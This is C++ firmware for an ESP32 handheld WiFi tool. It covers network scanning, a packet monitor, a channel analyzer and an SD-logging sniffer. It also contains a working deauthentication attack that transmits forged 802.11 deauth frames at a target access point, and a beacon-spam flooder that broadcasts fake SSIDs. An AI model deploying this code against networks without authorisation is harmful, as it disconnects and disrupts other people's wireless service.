#include "wifi_module.h"
#include <WiFi.h>
#include <WiFiServer.h>
#include <WiFiUdp.h>
#include <algorithm>
#include <functional>
#include "esp_wifi.h"
#include "display.h"
#include "buttons.h"
#include "menu.h"
#include "helpers.h"
#include "config.h"
#include "sdcard.h"
#include "deauth.h"
#include <cmath>
#include <cstdio>
#include <lwip/sockets.h>
#include <fcntl.h>
#include <errno.h>

// ====================================================================
//  Shared UI helpers (unchanged)
// ====================================================================
struct RedrawTimer {
  unsigned long last = 0;
  bool due(unsigned long intervalMs) {
    unsigned long now = millis();
    if (now - last >= intervalMs) { last = now; return true; }
    return false;
  }
  void reset() { last = 0; }
};

struct ChannelNav {
  bool manual = false;
  unsigned long lastHop = 0;
  void (*setCh)(uint8_t) = nullptr;
  void (*hopCh)() = nullptr;
  uint8_t (*getCh)() = nullptr;

  void begin(void (*set)(uint8_t), void (*hop)(), uint8_t (*get)()) {
    setCh = set; hopCh = hop; getCh = get;
    manual = false;
    lastHop = 0;
  }
  bool handleEvent(int evt) {
    if (!getCh) return false;
    if (evt == EVT_LEFT) {
      manual = true;
      uint8_t ch = getCh(); ch = (ch <= 1) ? 13 : ch - 1;
      setCh(ch);
      return true;
    }
    if (evt == EVT_RIGHT) {
      manual = true;
      uint8_t ch = getCh(); ch = (ch >= 13) ? 1 : ch + 1;
      setCh(ch);
      return true;
    }
    if (evt == EVT_UP) {
      manual = false;
      return true;
    }
    return false;
  }
  void tick(unsigned long hopIntervalMs) {
    if (manual || !hopCh) return;
    unsigned long now = millis();
    if (now - lastHop < hopIntervalMs) return;
    lastHop = now;
    hopCh();
  }
  String label() const { return manual ? " (pinned)" : " (hop)"; }
};

struct ScrollList {
  int topRow = 0;
  int selRow = 0;
  void reset() { topRow = 0; selRow = 0; }
  void up() { if (selRow > 0) selRow--; }
  void down(int count) { if (selRow < count - 1) selRow++; }
};

static int scrollVisibleRows(int top, int footerH, int rowH) {
  int listH = tft.height() - top - footerH - 4;
  return max(1, listH / rowH);
}

static int scrollbarWidthFor(int count, int visibleRows) {
  return (count > visibleRows) ? 4 : 0;
}

static void drawScrollListBody(ScrollList& list, int count, int top, int footerH,
                                int rowH, bool selectable,
                                const std::function<void(int, int, bool)>& drawRow) {
  if (count <= 0) return;
  int visibleRows = scrollVisibleRows(top, footerH, rowH);
  if (list.selRow < list.topRow) list.topRow = list.selRow;
  if (list.selRow >= list.topRow + visibleRows) list.topRow = list.selRow - visibleRows + 1;
  int scrollbarW = scrollbarWidthFor(count, visibleRows);

  int y = top;
  for (int row = 0; row < visibleRows; row++) {
    int i = list.topRow + row;
    if (i >= count) break;
    drawRow(i, y, selectable && i == list.selRow);
    y += rowH;
  }
  if (scrollbarW > 0) {
    int trackX = tft.width() - scrollbarW;
    int trackH = visibleRows * rowH;
    tft.drawRect(trackX, top - 2, scrollbarW, trackH, displayColorFgDim());
    int thumbH = max(6, trackH * visibleRows / count);
    int thumbY = top - 2 + (trackH - thumbH) * list.topRow / max(1, count - visibleRows);
    tft.fillRect(trackX, thumbY, scrollbarW, thumbH, displayColorFg());
  }
}

// ====================================================================
//  Accent color palette (custom RGB565 colors, additive to the app's
//  displayColor*() theme). Base backgrounds/text keep using the theme
//  functions so this still respects light/dark mode; these are only
//  used for status highlights, borders, pills, and progress fills so
//  the WiFi screens read as one coherent, colorful, professional set
//  instead of everything staying single-tone.
// ====================================================================
constexpr uint16_t wifiRgb565(uint8_t r, uint8_t g, uint8_t b) {
    return ((uint16_t)(r & 0xF8) << 8) | ((uint16_t)(g & 0xFC) << 3) | (b >> 3);
}

constexpr uint16_t UI_ACCENT_BLUE   = wifiRgb565(66, 150, 255);  // primary / neutral action
constexpr uint16_t UI_ACCENT_CYAN   = wifiRgb565(72, 222, 255);  // idle / scanning / info
constexpr uint16_t UI_ACCENT_PURPLE = wifiRgb565(168, 120, 255); // secondary accent
constexpr uint16_t UI_ACCENT_GREEN  = wifiRgb565(70, 226, 148);  // success / captured / go
constexpr uint16_t UI_ACCENT_AMBER  = wifiRgb565(255, 176, 59);  // caution / detecting
constexpr uint16_t UI_ACCENT_RED    = wifiRgb565(255, 87, 97);   // danger / attack / running

// --------------------------------------------------------------------
//  Lightweight animation helpers (non-blocking, millis()-driven) - same
//  approach used in rf_module.cpp, so all three modules animate the
//  same way instead of each having its own ad-hoc timing.
// --------------------------------------------------------------------
static unsigned long wifiUiAnimEpochMs = 0;

static inline float wifiUiPhase(float speedPerMs) {
  if (wifiUiAnimEpochMs == 0) wifiUiAnimEpochMs = millis();
  return (float)(millis() - wifiUiAnimEpochMs) * speedPerMs;
}

// Smoothly pulses a color's brightness between minLevel and full using a
// sine wave - a softer, more polished alternative to a hard on/off blink.
// Used for "live" states (running/attacking/capturing) so the UI breathes
// instead of flickering.
static uint16_t wifiUiBreathe(uint16_t color, float speedPerMs = 0.0025f, float minLevel = 0.7f) {
  float t = (sinf(wifiUiPhase(speedPerMs)) + 1.0f) * 0.5f; // 0..1
  float level = minLevel + t * (1.0f - minLevel);
  uint8_t r = (color >> 11) & 0x1F;
  uint8_t g = (color >> 5) & 0x3F;
  uint8_t b = color & 0x1F;
  r = (uint8_t)(r * level);
  g = (uint8_t)(g * level);
  b = (uint8_t)(b * level);
  return (uint16_t)((r << 11) | (g << 5) | b);
}

// Blends a color toward white by `amount` (0 = unchanged, 1 = white).
static uint16_t wifiUiLighten(uint16_t color, float amount) {
  uint8_t r = (color >> 11) & 0x1F;
  uint8_t g = (color >> 5) & 0x3F;
  uint8_t b = color & 0x1F;
  r = (uint8_t)(r + (31 - r) * amount);
  g = (uint8_t)(g + (63 - g) * amount);
  b = (uint8_t)(b + (31 - b) * amount);
  return (uint16_t)((r << 11) | (g << 5) | b);
}

static void beginScreen(const char* title, uint16_t accent = 0, bool pulse = false) {
  tft.fillScreen(displayColorBg());
  displayDrawHeaderBar(title);
  // Thin accent underline just below the shared header bar - a quick
  // colour cue for which mode is active, echoed by status pills further
  // down each screen. Omitted when no accent is passed (accent == 0).
  // Breathes gently when `pulse` marks the screen as actively live.
  if (accent != 0) {
    uint16_t drawAccent = pulse ? wifiUiBreathe(accent) : accent;
    tft.drawFastHLine(0, displayHeaderHeight(), tft.width(), drawAccent);
    tft.drawFastHLine(0, displayHeaderHeight() + 1, tft.width(), drawAccent);
  }
  tft.setTextColor(displayColorFg(), displayColorBg());
  tft.setTextSize(1);
}

static void clearBody(int top) {
  tft.fillRect(0, top, tft.width(), tft.height() - top, displayColorBg());
  tft.setTextColor(displayColorFg(), displayColorBg());
  tft.setTextSize(1);
}

static void drawFooter(const String& hint) {
  tft.setTextColor(displayColorFgDim(), displayColorBg());
  tft.setTextSize(1);
  tft.setCursor(8, tft.height() - 14);
  tft.print(hint);
}

// Small rounded status badge, right-aligned to `rightX`. Shared by every
// redesigned screen so "IDLE / RUNNING / CAPTURED / ..." always reads
// the same way instead of each screen inventing its own label style.
// `pulse` breathes the badge fill for "live" states (running/attacking).
static void drawStatusPill(int rightX, int y, const String& text, uint16_t accent, bool pulse = false) {
  int pillW = tft.textWidth(text) + 10;
  int pillX = rightX - pillW;
  tft.fillRoundRect(pillX, y, pillW, 14, 7, pulse ? wifiUiBreathe(accent) : accent);
  tft.setTextColor(TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(pillX + 5, y + 3);
  tft.print(text);
}

static String elideToWidth(const String& s, int maxChars) {
  if ((int)s.length() <= maxChars) return s;
  if (maxChars <= 3) return s.substring(0, maxChars);
  return s.substring(0, maxChars - 3) + "...";
}

// Signal-strength-to-color mapping shared by every screen that shows an
// RSSI value, so "good/ok/weak" always reads the same three colors.
static uint16_t wifiRssiColor(int rssi) {
  if (rssi >= -55) return UI_ACCENT_GREEN;
  if (rssi >= -75) return UI_ACCENT_AMBER;
  return UI_ACCENT_RED;
}

static void drawNetRowCells(const WifiNet& n, int x, int y, int ssidColW, int rssiColW, int chanColW, bool selected) {
  const int charW = 6;
  int ssidMaxChars = max(4, ssidColW / charW);
  tft.setCursor(x, y);
  tft.print(elideToWidth(n.ssid, ssidMaxChars));
  x += ssidColW;
  String rssiStr = String(n.rssi);
  // RSSI gets its own color cue (green/amber/red) rather than staying the
  // same plain text color as everything else - it's the one field people
  // scan the list for. Skipped on the selected row so it doesn't fight
  // the selection highlight's own text color.
  if (!selected) tft.setTextColor(wifiRssiColor(n.rssi), displayColorBg());
  tft.setCursor(x + (rssiColW - (int)rssiStr.length() * charW), y);
  tft.print(rssiStr);
  if (!selected) tft.setTextColor(displayColorFg(), displayColorBg());
  x += rssiColW;
  tft.setCursor(x, y);
  tft.print("ch" + String(n.channel));
  x += chanColW;
  tft.setCursor(x, y);
  tft.print(n.enc);
}

static void drawNetworkListScreen(const char* titlePrefix, ScrollList& list,
                                   const std::vector<WifiNet>& nets, const String& footerHint) {
  String title = String(titlePrefix) + " (" + String(nets.size()) + ")";
  beginScreen(title.c_str(), UI_ACCENT_BLUE);
  int top = displayHeaderHeight() + 4;
  const int footerH = 14;
  const int rowH = 18;

  if (nets.empty()) {
    tft.setCursor(8, top);
    tft.print("No networks found");
  } else {
    int visibleRows = scrollVisibleRows(top, footerH, rowH);
    int scrollbarW = scrollbarWidthFor((int)nets.size(), visibleRows);
    const int rssiColW = 42, chanColW = 26, encColW = 46;
    const int ssidColX = 8;
    int ssidColW = tft.width() - ssidColX - rssiColW - chanColW - encColW - scrollbarW - 6;

    drawScrollListBody(list, (int)nets.size(), top, footerH, rowH, /*selectable=*/true,
      [&](int i, int y, bool selected) {
        const WifiNet& n = nets[i];
        if (selected) {
          tft.fillRect(0, y - 2, tft.width() - scrollbarW, rowH, displayColorSelectBg());
          tft.setTextColor(displayColorSelectFg(), displayColorSelectBg());
        } else {
          tft.setTextColor(displayColorFg(), displayColorBg());
        }
        tft.setTextSize(1);
        drawNetRowCells(n, ssidColX, y, ssidColW, rssiColW, chanColW, selected);
      });
  }
  drawFooter(footerHint);
}

// ====================================================================
//  Core WiFi (unchanged)
// ====================================================================
void wifiInit() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
}

static void wifiEnsureStaMode() {
  esp_wifi_set_promiscuous(false);
  wifi_mode_t mode = WiFi.getMode();
  if (mode == WIFI_STA || mode == WIFI_AP_STA) return;
  if (mode == WIFI_AP) {
    WiFi.mode(WIFI_AP_STA);
  } else {
    WiFi.mode(WIFI_STA);
  }
  WiFi.disconnect();
  delay(50);
}

static const char* encToStr(wifi_auth_mode_t enc) {
  switch (enc) {
    case WIFI_AUTH_OPEN:            return "OPEN";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "WPA";
    case WIFI_AUTH_WPA2_PSK:        return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-EAP";
    case WIFI_AUTH_WPA3_PSK:        return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
    default:                        return "?";
  }
}

static std::vector<WifiNet> buildSortedResults(int n) {
  std::vector<WifiNet> out;
  if (n <= 0) {
    WiFi.scanDelete();
    return out;
  }
  std::vector<int> order(n);
  for (int i = 0; i < n; i++) order[i] = i;
  std::sort(order.begin(), order.end(),
            [](int a, int b) { return WiFi.RSSI(a) > WiFi.RSSI(b); });
  for (int i : order) {
    WifiNet net;
    net.ssid = WiFi.SSID(i);
    if (net.ssid.length() == 0) net.ssid = "(hidden)";
    net.bssid = WiFi.BSSIDstr(i);
    net.rssi = WiFi.RSSI(i);
    net.channel = WiFi.channel(i);
    net.enc = encToStr(WiFi.encryptionType(i));
    out.push_back(net);
  }
  WiFi.scanDelete();
  return out;
}

std::vector<WifiNet> wifiScanRaw() {
  wifiEnsureStaMode();
  int n = WiFi.scanNetworks(false, true);
  return buildSortedResults(n);
}

void wifiScanStart() {
  wifiEnsureStaMode();
  WiFi.scanNetworks(true, true);
}
bool wifiScanIsComplete() {
  int n = WiFi.scanComplete();
  return n != WIFI_SCAN_RUNNING && n != WIFI_SCAN_FAILED;
}
bool wifiScanHasFailed() {
  return WiFi.scanComplete() == WIFI_SCAN_FAILED;
}
std::vector<WifiNet> wifiScanFinish() {
  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING || n == WIFI_SCAN_FAILED) return std::vector<WifiNet>();
  return buildSortedResults(n);
}

std::vector<String> wifiScanNetworks() {
  std::vector<String> out;
  auto nets = wifiScanRaw();
  if (nets.empty()) {
    out.push_back("(no networks found)");
    return out;
  }
  for (auto& n : nets) {
    out.push_back(n.ssid + "  " + String(n.rssi) + "dBm ch" + String(n.channel) + " " + n.enc);
  }
  return out;
}

String wifiGetStatusLine() {
  return "MAC: " + WiFi.macAddress();
}

// ====================================================================
//  Packet Monitor (unchanged)
// ====================================================================
static volatile WifiPacketCounts packetCounts = {0, 0, 0, 0, 0, 0, 0, 0};
static uint8_t monitorChannel = 1;

static const int PM_WATERFALL_COLS = 64;        // number of time slices
static uint8_t pmWaterfall[13][PM_WATERFALL_COLS]; // 13 channels, 64 columns
static uint32_t pmChanCounts[13] = {0};          // per‑channel frame counters
static uint32_t pmLastTotalFrames = 0;
static uint32_t pmLastPktPerSec = 0;
static ChannelNav pmChannelNav;
static RedrawTimer pmRedraw;  

static void IRAM_ATTR packetMonitorCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  uint8_t fc0 = pkt->payload[0];
  uint8_t frameType = (fc0 >> 2) & 0x03;

  // ---- Per‑channel counter ----
  uint8_t ch = pkt->rx_ctrl.channel;
  if (ch >= 1 && ch <= 13) {
    pmChanCounts[ch - 1]++;
  }

  // ---- Existing packet type counters ----
  switch (type) {
    case WIFI_PKT_MGMT: {
      packetCounts.mgmt++;
      uint8_t subtype = (fc0 >> 4) & 0x0F;
      switch (subtype) {
        case 4:  packetCounts.probeReq++;  break;
        case 5:  packetCounts.probeResp++; break;
        case 8:  packetCounts.beacon++;    break;
        case 10: packetCounts.disassoc++;  break;
        case 12: packetCounts.deauth++;    break;
        default: break;
      }
      break;
    }
    case WIFI_PKT_CTRL:
      packetCounts.ctrl++;
      break;
    case WIFI_PKT_DATA:
      packetCounts.data++;
      break;
    default:
      if (frameType == 0x01) packetCounts.ctrl++;
      else if (frameType == 0x02) packetCounts.data++;
      break;
  }
}

void wifiStartPacketMonitor() {
  wifiResetPacketCounts();
  monitorChannel = 1;
  wifiEnsureStaMode();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&packetMonitorCallback);
  esp_wifi_set_channel(monitorChannel, WIFI_SECOND_CHAN_NONE);
}
void wifiStopPacketMonitor() { esp_wifi_set_promiscuous(false); }
void wifiPacketMonitorHopChannel() {
  monitorChannel = (monitorChannel % 13) + 1;
  esp_wifi_set_channel(monitorChannel, WIFI_SECOND_CHAN_NONE);
}
void wifiPacketMonitorSetChannel(uint8_t channel) {
  if (channel < 1 || channel > 13) return;
  monitorChannel = channel;
  esp_wifi_set_channel(monitorChannel, WIFI_SECOND_CHAN_NONE);
}
uint8_t wifiPacketMonitorGetChannel() { return monitorChannel; }

WifiPacketCounts wifiGetPacketCounts() {
  WifiPacketCounts snapshot;
  snapshot.mgmt = packetCounts.mgmt;
  snapshot.beacon = packetCounts.beacon;
  snapshot.probeReq = packetCounts.probeReq;
  snapshot.probeResp = packetCounts.probeResp;
  snapshot.deauth = packetCounts.deauth;
  snapshot.disassoc = packetCounts.disassoc;
  snapshot.ctrl = packetCounts.ctrl;
  snapshot.data = packetCounts.data;
  return snapshot;
}

void wifiResetPacketCounts() {
  packetCounts.mgmt = 0;
  packetCounts.beacon = 0;
  packetCounts.probeReq = 0;
  packetCounts.probeResp = 0;
  packetCounts.deauth = 0;
  packetCounts.disassoc = 0;
  packetCounts.ctrl = 0;
  packetCounts.data = 0;
}

uint32_t wifiGetDeauthCount() {
  return packetCounts.deauth + packetCounts.disassoc;
}

static void updateWaterfall() {
  // Shift columns left
  for (int ch = 0; ch < 13; ch++) {
    memmove(&pmWaterfall[ch][0], &pmWaterfall[ch][1], PM_WATERFALL_COLS - 1);
    uint32_t cnt = pmChanCounts[ch];
    uint8_t intensity = (uint8_t)min((uint32_t)255, cnt * 255 / 40);
    pmWaterfall[ch][PM_WATERFALL_COLS - 1] = intensity;
  }
  memset(pmChanCounts, 0, sizeof(pmChanCounts));
}

// ====================================================================
//  Deauth Attack (unchanged)
// ====================================================================
static bool deauthRunning = false;
static uint8_t deauthBssid[6];
static uint8_t deauthChannel = 1;
static String deauthSsid = "";
static String deauthBssidStr = "";
static uint16_t deauthSeq = 0;
static uint32_t deauthFramesSent = 0;
static unsigned long deauthLastSend = 0;

static bool parseMac(const String& macStr, uint8_t out[6]) {
  int vals[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)vals[i];
  return true;
}

void wifiDeauthSetTarget(const String& ssid, const String& bssidStr, uint8_t channel) {
  deauthSsid = ssid;
  deauthBssidStr = bssidStr;
  deauthChannel = channel;
  parseMac(bssidStr, deauthBssid);
}
void wifiDeauthStart() {
  deauthRunning = true;
  deauthSeq = 0;
  deauthFramesSent = 0;
  deauthLastSend = millis();
  if (deauthChannel < 1 || deauthChannel > 13) deauthChannel = 1;
  esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
}
void wifiDeauthStop() {
  deauthRunning = false;
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}
bool wifiDeauthIsRunning() { return deauthRunning; }
uint32_t wifiDeauthFramesSent() { return deauthFramesSent; }
String wifiDeauthGetTargetSsid() { return deauthSsid; }
String wifiDeauthGetTargetBssid() { return deauthBssidStr; }
uint8_t wifiDeauthGetChannel() { return deauthChannel; }

void wifiDeauthTick() {
  if (!deauthRunning) return;
  unsigned long now = millis();
  if (now - deauthLastSend < 100) return;
  deauthLastSend = now;
  // Fixed deauth frame (broadcast DA) – same as before but using correct offsets
  uint8_t frame[26];
  frame[0] = 0xC0;
  frame[1] = 0x00;
  frame[2] = 0x00; frame[3] = 0x00; // Duration
  memset(&frame[4], 0xFF, 6);        // DA = broadcast
  memcpy(&frame[10], deauthBssid, 6);
  memcpy(&frame[16], deauthBssid, 6);
  frame[22] = (deauthSeq & 0x0F) << 4;
  frame[23] = (deauthSeq >> 4) & 0xFF;
  frame[24] = 0x07;
  frame[25] = 0x00;
  deauthSeq = (deauthSeq + 1) & 0x0FFF;
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  deauthFramesSent++;
}

// ====================================================================
//  Beacon Spam (unchanged)
// ====================================================================
static const char* beaconSsidList[] = {
  "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
  "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
  "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
  "DropItLikeItsHotspot", "Loading...", "I_AM_Watching_You", "Why_Tho?",
  "Get_Your_Own_WiFi", "NSA_Surveillance_Van", "WiFi_Fairy", "Undercover_Potato",
  "TheLANBeforeTime", "ItHurtsWhen_IP", "IPFreely", "NoInternetHere",
  "LookMaNoCables", "Router?IHardlyKnewHer", "ShutUpAndConnect", "Mom_UseThisOne",
  "Not_for_You", "OopsAllSSID", "ItsOver9000", "Bob's_Wifi_Burgers",
  "Overclocked_Toaster", "Pikachu_Used_WiFi", "Cheese_Bandit", "Quantum_Tunnel",
  "Meme_LANd"
};
static const int beaconSsidCount = sizeof(beaconSsidList) / sizeof(beaconSsidList[0]);

static bool beaconRunning = false;
static uint8_t beaconChannel = 1;
static uint8_t beaconSsidIdx = 0;
static uint32_t beaconFramesSent = 0;
static unsigned long beaconLastSend = 0;
static uint8_t beaconMac[6] = {0};
static uint8_t beaconPkt[128];

static const unsigned long BEACON_INTERVAL_MS = 10;
static const int BEACON_BURST = 15;

static uint16_t buildBeacon(const char* ssid, uint8_t channel, uint8_t* out, uint16_t outMax) {
    if (!ssid || !out || outMax < 64) return 0;

    static const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    uint8_t ssidLen = (uint8_t)min((size_t)32, strlen(ssid));
    uint16_t need = 24 + 12 + (2 + ssidLen) + (2 + sizeof(rates)) + (2 + 1);
    if (need > outMax) return 0;

    uint16_t pos = 0;
    out[pos++] = 0x80;
    out[pos++] = 0x00;
    out[pos++] = 0x00;
    out[pos++] = 0x00;
    memset(&out[pos], 0xFF, 6);
    pos += 6;
    memcpy(&out[pos], beaconMac, 6);
    pos += 6;
    memcpy(&out[pos], beaconMac, 6);
    pos += 6;
    out[pos++] = 0x00;
    out[pos++] = 0x00;
    memset(&out[pos], 0, 8);
    pos += 8;
    out[pos++] = 0x64;
    out[pos++] = 0x00;
    out[pos++] = 0x01;
    out[pos++] = 0x04;
    out[pos++] = 0x00;
    out[pos++] = ssidLen;
    memcpy(&out[pos], ssid, ssidLen);
    pos += ssidLen;
    out[pos++] = 0x01;
    out[pos++] = sizeof(rates);
    memcpy(&out[pos], rates, sizeof(rates));
    pos += sizeof(rates);
    out[pos++] = 0x03;
    out[pos++] = 0x01;
    out[pos++] = channel;
    return pos;
}

void wifiBeaconSetChannel(uint8_t channel) {
  if (channel < 1 || channel > 13) channel = 1;
  beaconChannel = channel;
}

void wifiBeaconStart() {
  beaconRunning = true;
  beaconFramesSent = 0;
  beaconLastSend = millis();
  beaconSsidIdx = 0;
  beaconMac[0] = 0x02;
  beaconMac[1] = 0xDE;
  beaconMac[2] = 0xAD;
  beaconMac[3] = 0xBE;
  beaconMac[4] = 0xEF;
  beaconMac[5] = (uint8_t)random(256);

  WiFi.mode(WIFI_AP);
  delay(50);
  WiFi.softAP(".", nullptr, beaconChannel, 1, 4);
  delay(50);
  esp_wifi_set_channel(beaconChannel, WIFI_SECOND_CHAN_NONE);
}

void wifiBeaconStop() {
  beaconRunning = false;
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(10);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}
bool wifiBeaconIsRunning() { return beaconRunning; }
uint32_t wifiBeaconFramesSent() { return beaconFramesSent; }
uint8_t wifiBeaconGetChannel() { return beaconChannel; }

void wifiBeaconTick() {
  if (!beaconRunning) return;
  unsigned long now = millis();
  if (now - beaconLastSend < BEACON_INTERVAL_MS) return;
  beaconLastSend = now;

  const char* ssid = beaconSsidList[beaconSsidIdx % beaconSsidCount];
  beaconSsidIdx = (beaconSsidIdx + 1) % beaconSsidCount;
  beaconMac[3] = (uint8_t)(0xBE + (beaconSsidIdx % 100));
  beaconMac[4] = (uint8_t)(0xEF + ((beaconSsidIdx * 3) % 100));
  beaconMac[5] = (uint8_t)random(256);

  uint16_t len = buildBeacon(ssid, beaconChannel, beaconPkt, sizeof(beaconPkt));
  if (len == 0) return;

  esp_wifi_set_channel(beaconChannel, WIFI_SECOND_CHAN_NONE);
  delayMicroseconds(50);

  int sent = 0;
  for (int n = 0; n < BEACON_BURST; n++) {
    int ret = esp_wifi_80211_tx(WIFI_IF_AP, beaconPkt, len, false);
    if (ret == 0) sent++;
    else break; // if one fails, stop to avoid flooding
  }
  beaconFramesSent += sent;
}

// ====================================================================
//  Channel Analyzer (unchanged)
// ====================================================================
static volatile uint32_t caFrameCounter = 0;
static uint16_t caActivity[13] = {0};
static uint8_t caCurChannel = 1;
static unsigned long caDwellStart = 0;
static const unsigned long CA_DWELL_MS = 150;

static void IRAM_ATTR channelAnalyzerCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  (void)buf; (void)type;
  caFrameCounter++;
}

void wifiChannelAnalyzerStart() {
  memset(caActivity, 0, sizeof(caActivity));
  caCurChannel = 1;
  caFrameCounter = 0;
  wifiEnsureStaMode();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&channelAnalyzerCallback);
  esp_wifi_set_channel(caCurChannel, WIFI_SECOND_CHAN_NONE);
  caDwellStart = millis();
}
void wifiChannelAnalyzerStop() {
  esp_wifi_set_promiscuous(false);
}
void wifiChannelAnalyzerTick() {
  unsigned long now = millis();
  if (now - caDwellStart < CA_DWELL_MS) return;
  uint32_t frames = caFrameCounter;
  caActivity[caCurChannel - 1] = (uint16_t)std::min((uint32_t)65535, frames);
  caFrameCounter = 0;
  caCurChannel = (caCurChannel % 13) + 1;
  esp_wifi_set_channel(caCurChannel, WIFI_SECOND_CHAN_NONE);
  caDwellStart = now;
}
uint16_t wifiChannelAnalyzerGetActivity(uint8_t channel1to13) {
  if (channel1to13 < 1 || channel1to13 > 13) return 0;
  return caActivity[channel1to13 - 1];
}
uint8_t wifiChannelAnalyzerGetCurrentChannel() { return caCurChannel; }

// ====================================================================
//  Sniffer (unchanged)
// ====================================================================
// ---- Sniffer ring buffer ----
struct SniffRec {
  unsigned long ts;
  uint8_t type;
  uint8_t subtype;
  int8_t rssi;
  uint8_t channel;
  uint16_t len;
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
};
static const int SNIFF_RING_SIZE = 48;
static SniffRec sniffRing[SNIFF_RING_SIZE];
static volatile int sniffHead = 0;
static volatile int sniffTail = 0;
static volatile uint32_t sniffDroppedFull = 0;
static uint32_t sniffLoggedTotal = 0;
static bool sniffFileReady = false;
static const char* SNIFF_PATH = "/sniff_log.csv";
static uint8_t sniffChannel = 1;
static bool sniffManualChannel = false;

// ---- Sniffer live stats (ADD THIS) ----
static uint32_t snifferMgmt = 0;
static uint32_t snifferCtrl = 0;
static uint32_t snifferData = 0;
static int8_t snifferLastRssi = 0;
static uint8_t snifferLastChannel = 1;
static uint32_t snifferPrevTotal = 0;
static uint32_t snifferPktRate = 0;
static unsigned long snifferLastUpdate = 0;

static void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;

  // ---- Update live stats (fast, non‑blocking) ----
  snifferLastRssi = (int8_t)pkt->rx_ctrl.rssi;
  snifferLastChannel = pkt->rx_ctrl.channel;
  switch (type) {
    case WIFI_PKT_MGMT: snifferMgmt++; break;
    case WIFI_PKT_CTRL: snifferCtrl++; break;
    case WIFI_PKT_DATA: snifferData++; break;
    default: break;
  }

  // ---- Ring buffer storage (existing logic) ----
  int nextHead = (sniffHead + 1) % SNIFF_RING_SIZE;
  if (nextHead == sniffTail) {
    sniffDroppedFull++;
    return;
  }

  const uint8_t* p = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  SniffRec& r = sniffRing[sniffHead];
  r.ts = millis();
  r.rssi = (int8_t)pkt->rx_ctrl.rssi;
  r.channel = pkt->rx_ctrl.channel;
  r.len = len;

  uint8_t fc0 = p[0];
  uint8_t frameType = (fc0 >> 2) & 0x03;
  r.subtype = (fc0 >> 4) & 0x0F;
  r.type = (type == WIFI_PKT_MGMT) ? 0 : (frameType == 0x01 ? 1 : 2);

  if (len >= 24) {
    memcpy(r.addr1, p + 4, 6);
    memcpy(r.addr2, p + 10, 6);
    memcpy(r.addr3, p + 16, 6);
  } else {
    memset(r.addr1, 0, 6);
    memset(r.addr2, 0, 6);
    memset(r.addr3, 0, 6);
  }

  sniffHead = nextHead;
}

static String macToStr(const uint8_t* m) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
  return String(buf);
}

void wifiSnifferStart() {
  sniffHead = 0; sniffTail = 0; sniffDroppedFull = 0; sniffLoggedTotal = 0;
  sniffFileReady = false;
  sniffChannel = 1;
  sniffManualChannel = false;
  wifiEnsureStaMode();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
}
void wifiSnifferStop() {
  esp_wifi_set_promiscuous(false);
}
void wifiSnifferSetChannel(uint8_t ch) {
  if (ch < 1 || ch > 13) return;
  sniffChannel = ch;
  esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
}
void wifiSnifferHopChannel() {
  sniffChannel = (sniffChannel % 13) + 1;
  esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
}
uint8_t wifiSnifferGetChannel() { return sniffChannel; }
uint32_t wifiSnifferGetLoggedCount() { return sniffLoggedTotal; }
uint32_t wifiSnifferGetDroppedCount() { return sniffDroppedFull; }

void wifiSnifferTick() {
  static const char* typeNames[3] = {"MGMT", "CTRL", "DATA"};
  while (sniffTail != sniffHead) {
    if (!sniffFileReady) {
      String content;
      if (!sdReadFile(SNIFF_PATH, content) || content.length() == 0) {
        sdWriteFile(SNIFF_PATH, "ts_ms,type,subtype,rssi,channel,len,addr1,addr2,addr3\n");
      }
      sniffFileReady = true;
    }
    SniffRec r = sniffRing[sniffTail];
    sniffTail = (sniffTail + 1) % SNIFF_RING_SIZE;
    char line[160];
    snprintf(line, sizeof(line), "%lu,%s,%u,%d,%u,%u,%s,%s,%s",
             r.ts, typeNames[r.type], r.subtype, r.rssi, r.channel, r.len,
             macToStr(r.addr1).c_str(), macToStr(r.addr2).c_str(), macToStr(r.addr3).c_str());
    if (sdAppendLine(SNIFF_PATH, String(line))) sniffLoggedTotal++;
  }
}

